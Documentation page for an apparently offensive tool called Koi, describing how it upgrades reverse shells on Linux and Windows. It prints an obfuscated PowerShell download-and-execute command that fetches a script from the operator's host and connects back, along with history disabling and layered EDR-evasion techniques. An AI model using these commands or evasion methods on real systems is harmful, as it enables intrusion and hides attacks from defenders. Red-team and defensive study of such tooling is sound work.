# Upgrading Sessions

Koi allows you to automatically upgrade your sessions for both Linux and Windows.

## For Linux

The upgrade command tries three methods in order, falling back to the next if the previous one fails or is not available:

1. **`script`**, spawns a PTY using the `script` utility, available on virtually every Linux system:
   ```bash
   script -qc /bin/bash /dev/null
   ```
2. **`socat`**, if `script` is absent, tries `socat` as an alternative PTY spawner.
3. **Fallback**, if neither is available, runs `/bin/bash -i` or `/bin/sh -i` for a basic interactive shell without full PTY support.

After the PTY is established, Koi sets `TERM=xterm-256color`, disables history (`HISTSIZE=0 HISTFILESIZE=0`), and syncs the terminal window size.

!!! warning "Limitations"
    If none of these commands are available, or if the shell is too restricted, the upgrade will fail or produce a degraded shell. Alternative upgrade paths are planned, see [Future Updates](future-updates.md).

---

## For Windows

On Windows, Koi upgrades a raw reverse shell into a fully interactive PTY-like session using [ConPtyShell by antoniococo](https://github.com/antonioCoco/ConPtyShell).

The upgrade process is automatic and works as follows:

1. Koi downloads the latest `Invoke-ConPtyShell.ps1`
2. The script is cached locally for offline reuse
3. Koi obfuscates the PowerShell function name to reduce detections
4. A temporary HTTP server is spawned locally
5. The target downloads and executes the payload
6. A new interactive ConPTY session connects back

### How it works internally

Koi launches the following kind of command on the remote host:

```powershell
powershell -nop -ep bypass -enc <BASE64>
```

The base64 payload decodes to something like:

```powershell
&('Invoke-'+'Expression')(&(('{0}{1}'-f'Invoke-Web','Request') 'http://<IP>:<PORT>/c.ps1' -UseBasicParsing));
<OBFUSCATED_FUNCTION> -RemoteIp <IP> -RemotePort <PORT> -Rows <ROWS> -Cols <COLS> -CommandLine powershell
```

The outer command uses `-EncodedCommand` so no plaintext `IEX` or `IWR` appears on the command line. The inner payload uses randomised call obfuscation so cmdlet names are never literal strings.

### More details

#### Automatic caching

If GitHub is unreachable, Koi automatically falls back to the locally cached version of ConPtyShell.

#### Automatic terminal sizing

The current terminal dimensions are detected automatically and passed to ConPtyShell so the remote PTY matches your local console.

#### Session replacement

Once the upgraded session connects back:

- The old shell is closed
- The new ConPTY session replaces it transparently
- The session ID stays identical

### Requirements

The remote target must support:

- PowerShell
- HTTP connectivity to the operator machine
- Windows 10 / Windows Server 2019+ (recommended for ConPTY support)

### Notes

Some EDRs may still detect:

- `powershell.exe`
- `Invoke-WebRequest`
- ConPTY-related behaviours

Koi mitigates this through several layers:

- **`-EncodedCommand` base64 wrapping** — `IEX`, `IWR`, the URL, and the function name are invisible on the command line.
- **Randomised cmdlet obfuscation** — `Invoke-Expression` and `Invoke-WebRequest` are rewritten at runtime using one of three techniques (string concatenation, `-f` format string, or char-array join), chosen randomly each time.
- **Function and symbol renaming** — the ConPtyShell PS1 script has all class names, method names, and the entry-point function renamed to random identifiers.
- **C# string literal replacement** — known signal strings in the embedded C# source are replaced with char-array construction expressions.
- **In-memory execution** — the script is never written to disk; it is fetched and executed directly via `IEX`.